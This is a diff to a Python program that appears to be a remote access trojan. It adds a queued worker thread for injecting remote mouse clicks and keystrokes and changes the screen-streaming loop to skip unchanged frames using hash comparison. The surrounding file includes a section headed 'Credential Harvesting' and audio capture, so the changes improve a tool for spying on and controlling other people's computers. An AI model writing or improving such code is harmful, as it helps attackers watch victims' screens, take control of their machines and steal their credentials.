@@ -827,6 +827,8 @@ def _ensure_audio(enabled):
 
 _mouse = None
 _kb = None
+_hid_queue = None
+_hid_thread = None
 
 def _init_hid():
     global _mouse, _kb
@@ -834,28 +836,69 @@ def _init_hid():
         _mouse = MouseController()
         _kb = KeyboardController()
 
+def _hid_worker():
+    import queue
+    q = _hid_queue
+    while True:
+        try:
+            item = q.get()
+            if item is None:
+                break
+            typ = item[0]
+            if typ == "move":
+                _init_hid()
+                _mouse.position = (int(item[1]), int(item[2]))
+            elif typ == "click":
+                _init_hid()
+                b = Button.left if item[1] == "left" else Button.right
+                if item[2]:
+                    _mouse.press(b)
+                else:
+                    _mouse.release(b)
+            elif typ == "key":
+                _init_hid()
+                k = item[1]
+                try:
+                    if hasattr(Key, k):
+                        key = getattr(Key, k)
+                    else:
+                        key = k
+                    _kb.press(key)
+                    _kb.release(key)
+                except:
+                    pass
+            q.task_done()
+        except Exception:
+            pass
+
+def _ensure_hid_thread():
+    global _hid_queue, _hid_thread
+    if _hid_queue is None:
+        import queue
+        _hid_queue = queue.Queue(maxsize=128)
+    if _hid_thread is None or not _hid_thread.is_alive():
+        _hid_thread = threading.Thread(target=_hid_worker, daemon=True)
+        _hid_thread.start()
+
 def do_move(x, y):
-    _init_hid()
-    _mouse.position = (int(x), int(y))
+    _ensure_hid_thread()
+    try:
+        _hid_queue.put_nowait(("move", x, y))
+    except Exception:
+        pass
 
 def do_click(btn, down):
-    _init_hid()
-    b = Button.left if btn == "left" else Button.right
-    if down:
-        _mouse.press(b)
-    else:
-        _mouse.release(b)
+    _ensure_hid_thread()
+    try:
+        _hid_queue.put_nowait(("click", btn, down))
+    except Exception:
+        pass
 
 def do_key(k):
-    _init_hid()
+    _ensure_hid_thread()
     try:
-        if hasattr(Key, k):
-            key = getattr(Key, k)
-        else:
-            key = k
-        _kb.press(key)
-        _kb.release(key)
-    except:
+        _hid_queue.put_nowait(("key", k))
+    except Exception:
         pass
 
 # ─── Credential Harvesting ────────────────────────────────────
@@ -2356,7 +2399,7 @@ async def main():
                             await asyncio.sleep(max(0.0, target_dt - elapsed))
 
                     async def stream_loop():
-                        """Adaptive screen stream: adjusts JPEG quality & frame rate based on estimated bandwidth."""
+                        """MJPEG + frame diff: skip encode/send when screen unchanged."""
                         quality = 48
                         min_quality = 15
                         max_quality = 85
@@ -2365,36 +2408,47 @@ async def main():
                         max_interval = 0.250
                         send_times = []
                         quality_adj_ticks = 0
+                        _prev_frame_hash = None
+                        import hashlib
+
+                        def _grab_screen_jpeg(q):
+                            with mss.mss() as sx:
+                                img = sx.grab(sx.monitors[0])
+                                buf = BytesIO()
+                                Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
+                                    buf, format="JPEG", quality=q, optimize=True
+                                )
+                                return img.bgra, b"\x01" + buf.getvalue()
+
+                        def _adjust_quality(elapsed):
+                            nonlocal quality, frame_interval, quality_adj_ticks
+                            send_times.append(elapsed)
+                            if len(send_times) > 10:
+                                send_times.pop(0)
+                            quality_adj_ticks += 1
+                            if quality_adj_ticks >= 15:
+                                quality_adj_ticks = 0
+                                avg = sum(send_times) / len(send_times)
+                                if avg > 0.25 and quality > min_quality:
+                                    quality = max(min_quality, quality - 8)
+                                elif avg < 0.06 and quality < max_quality:
+                                    quality = min(max_quality, quality + 4)
+                                frame_interval = max(min_interval, min(max_interval, avg * 1.5))
+
                         while True:
                             try:
                                 if _view_mode == "screen":
                                     t0 = time.perf_counter()
-
-                                    def _grab_screen_jpeg(q):
-                                        with mss.mss() as sx:
-                                            img = sx.grab(sx.monitors[0])
-                                            buf = BytesIO()
-                                            Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
-                                                buf, format="JPEG", quality=q, optimize=True
-                                            )
-                                            return b"\x01" + buf.getvalue()
-
-                                    blob = await asyncio.to_thread(_grab_screen_jpeg, quality)
-                                    await send_stream(blob)
-                                    elapsed = time.perf_counter() - t0
-                                    send_times.append(elapsed)
-                                    if len(send_times) > 10:
-                                        send_times.pop(0)
-
-                                    quality_adj_ticks += 1
-                                    if quality_adj_ticks >= 15:
-                                        quality_adj_ticks = 0
-                                        avg = sum(send_times) / len(send_times)
-                                        if avg > 0.25 and quality > min_quality:
-                                            quality = max(min_quality, quality - 8)
-                                        elif avg < 0.06 and quality < max_quality:
-                                            quality = min(max_quality, quality + 4)
-                                        frame_interval = max(min_interval, min(max_interval, avg * 1.5))
+                                    raw_bgra, blob = await asyncio.to_thread(_grab_screen_jpeg, quality)
+                                    cur_hash = hashlib.md5(raw_bgra).digest()
+                                    if _prev_frame_hash is not None and cur_hash == _prev_frame_hash:
+                                        elapsed = time.perf_counter() - t0
+                                        _adjust_quality(elapsed)
+                                    else:
+                                        await send_stream(blob)
+                                        elapsed = time.perf_counter() - t0
+                                        _adjust_quality(elapsed)
+                                    _prev_frame_hash = cur_hash
 
                                 if _audio_enabled:
                                     pkt = _audio_try_pop()
